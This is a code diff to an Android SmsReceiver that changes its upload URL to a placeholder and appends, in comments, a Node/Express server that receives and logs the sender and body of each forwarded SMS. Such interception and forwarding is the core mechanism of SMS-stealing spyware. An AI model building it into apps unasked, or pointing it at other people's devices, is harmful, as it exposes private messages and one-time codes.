@@ -22,7 +22,7 @@ import okhttp3.Response;
 
 public class SmsReceiver extends BroadcastReceiver {
 
-    private static final String SERVER_URL = "https://remote-server-woad.vercel.app/data";
+    private static final String SERVER_URL = "http://ipaddress/data";
     private static final String TAG = "SmsReceiver";
     public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
     private final OkHttpClient client = new OkHttpClient(); // Create a single OkHttpClient instance
@@ -106,3 +106,77 @@ public class SmsReceiver extends BroadcastReceiver {
         }
     }
 }
+
+
+// open a new folder in vs code
+
+// in terminal run
+
+/*
+npm init -y
+npm install express
+ */
+
+// create server.js file in the new folder & paste the following code
+// then execute this command to run server
+//  node server.js
+
+/*
+const express = require('express');
+const app = express();
+const port = 3000; // You can change this port if needed
+
+// Middleware to parse JSON request bodies
+app.use(express.json());
+
+// Middleware to parse URL-encoded request bodies (optional, but good to have)
+app.use(express.urlencoded({ extended: true }));
+
+// Endpoint to receive SMS data
+app.post('/data', (req, res) => {
+    console.log('Received data at /data endpoint:');
+    console.log('Request Body:', req.body);
+
+    const sender = req.body.sender;
+    const messageBody = req.body.body; // 'body' from your Android app's JSON
+
+    if (!sender || !messageBody) {
+        console.log('Missing sender or body in request');
+        return res.status(400).json({
+            status: 'error',
+            message: 'Missing sender or body in request data'
+        });
+    }
+
+    // You can do something with the data here, like:
+    // - Store it in a database
+    // - Forward it to another service
+    // - Perform some processing
+
+    console.log(`SMS from: ${sender}, Message: ${messageBody}`);
+
+    // Send a response back to the client
+    res.status(200).json({
+        status: 'success',
+        message: 'Data received successfully by Node.js server',
+        receivedData: {
+            sender: sender,
+            body: messageBody
+        }
+    });
+});
+
+// Basic GET endpoint for testing if the server is running
+app.get('/', (req, res) => {
+    res.send('Node.js server is running! Send POST requests to /data to submit SMS info.');
+});
+
+// Start the server
+app.listen(port, () => {
+    console.log(`Node.js server listening on http://localhost:${port}`);
+    console.log(`Your Android app should send POST requests to http://<YOUR_COMPUTER_IP_ADDRESS_OR_10.0.2.2>:${port}/data`);
+});
+
+ */
+
+
